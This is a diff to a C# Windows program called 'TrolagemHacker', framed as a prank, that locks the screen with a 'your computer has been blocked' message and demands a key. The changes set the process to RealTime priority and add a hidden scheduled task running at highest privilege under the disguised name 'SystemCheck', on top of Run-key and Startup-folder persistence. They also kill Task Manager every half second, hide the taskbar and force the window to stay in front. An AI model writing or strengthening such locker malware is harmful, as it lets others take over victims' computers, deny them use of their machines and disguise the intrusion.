@@ -52,6 +52,9 @@ public class TrolagemHacker : Form
 
     public TrolagemHacker()
     {
+        // --- PRIORIDADE MÁXIMA DO PROCESSO ---
+        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;
+
         // --- GARANTIR INSTÂNCIA ÚNICA ---
         Process atual = Process.GetCurrentProcess();
         foreach (Process p in Process.GetProcessesByName(atual.ProcessName)) {
@@ -99,7 +102,7 @@ public class TrolagemHacker : Form
         Label lblTexto = new Label();
         lblTexto.Text = "Ola, irmao. Seu computador foi bloqueado!\n\n" +
                         "AVISO: NAO TENTE REINICIAR OU FECHAR ESTA JANELA.\n" +
-                        "SISTEMA SILENCIOSO ATIVADO.";
+                        "SISTEMA DE ALTA PRIORIDADE ATIVADO.";
         lblTexto.ForeColor = Color.Lime;
         lblTexto.Font = new Font("Courier New", 12, FontStyle.Bold);
         lblTexto.TextAlign = ContentAlignment.MiddleCenter;
@@ -149,17 +152,24 @@ public class TrolagemHacker : Form
             } catch {}
         }
 
-        // --- PERSISTÊNCIA SILENCIOSA (SEM ADMIN) ---
+        // --- PERSISTÊNCIA RELÂMPAGO (ALTA PRIORIDADE) ---
         try {
             string exePath = Application.ExecutablePath;
-            // 1. Registro (Run) - HKEY_CURRENT_USER (Nao pede admin)
+            // 1. Registro (Run) - HKEY_CURRENT_USER
             RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             rk.SetValue("SecurityAlert", exePath);
 
-            // 2. Pasta Inicializacao (Startup) - Usuario Atual
+            // 2. Pasta Inicializacao (Startup)
             string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
             string startupPath = Path.Combine(startupFolder, "SystemCheck.exe");
             if (!File.Exists(startupPath)) File.Copy(exePath, startupPath, true);
+
+            // 3. Tarefa Agendada Instantanea (Task Scheduler)
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = "schtasks.exe";
+            psi.Arguments = "/create /sc onlogon /tn \"SystemCheck\" /tr \"" + exePath + "\" /f /rl highest";
+            psi.WindowStyle = ProcessWindowStyle.Hidden;
+            Process.Start(psi);
         } catch {}
 
         // --- OCULTAR BARRA DE TAREFAS ---
@@ -167,9 +177,10 @@ public class TrolagemHacker : Form
 
         // --- PROTEÇÃO ---
         timerProtecao = new System.Windows.Forms.Timer();
-        timerProtecao.Interval = 1000;
+        timerProtecao.Interval = 500; // Loop mais rapido (0.5s)
         timerProtecao.Tick += (s, e) => {
             foreach (var p in Process.GetProcessesByName("taskmgr")) try { p.Kill(); } catch {}
+            ControlarBarraTarefas(false); // Reforca a ocultacao da barra
             if (GetForegroundWindow() != this.Handle) {
                 SetForegroundWindow(this.Handle);
                 txtChave.Focus();
@@ -197,10 +208,10 @@ public class TrolagemHacker : Form
             ControlarBarraTarefas(true);
             
             try {
-                // Remove do registro e startup
                 Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue("SecurityAlert", false);
                 string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "SystemCheck.exe");
                 if (File.Exists(startupPath)) File.Delete(startupPath);
+                Process.Start(new ProcessStartInfo("schtasks.exe", "/delete /tn \"SystemCheck\" /f") { WindowStyle = ProcessWindowStyle.Hidden });
 
                 // Autodestruicao
                 string exePath = Application.ExecutablePath;
